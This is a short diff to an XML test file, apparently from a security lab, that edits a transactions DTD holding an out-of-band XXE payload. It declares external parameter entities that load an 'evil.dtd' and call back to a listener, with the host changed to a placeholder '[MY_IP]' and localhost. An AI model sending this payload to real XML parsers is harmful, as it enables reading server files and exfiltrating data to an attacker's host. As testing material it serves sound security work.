@@ -7,8 +7,8 @@
         <!ELEMENT comment (#PCDATA)>
         <!ELEMENT transaction (fromAccountNo, toAccountNo, amount, currency, comment)>
         <!ELEMENT transactions (transaction*)>
-        <!ENTITY % victim SYSTEM 'http://sprg-tools.el.eee.intern:9090/victim?outOfBand=true'>
-        <!ENTITY % dtd SYSTEM "http://sprg-tools.el.eee.intern:9090/xml/evil.dtd">
+        <!ENTITY % nudget SYSTEM 'http://[MY_IP]:9090/nudget'>
+        <!ENTITY % dtd SYSTEM "http://localhost:8080/xml/evil.dtd">
         %dtd;
         ]>
 <transactions>
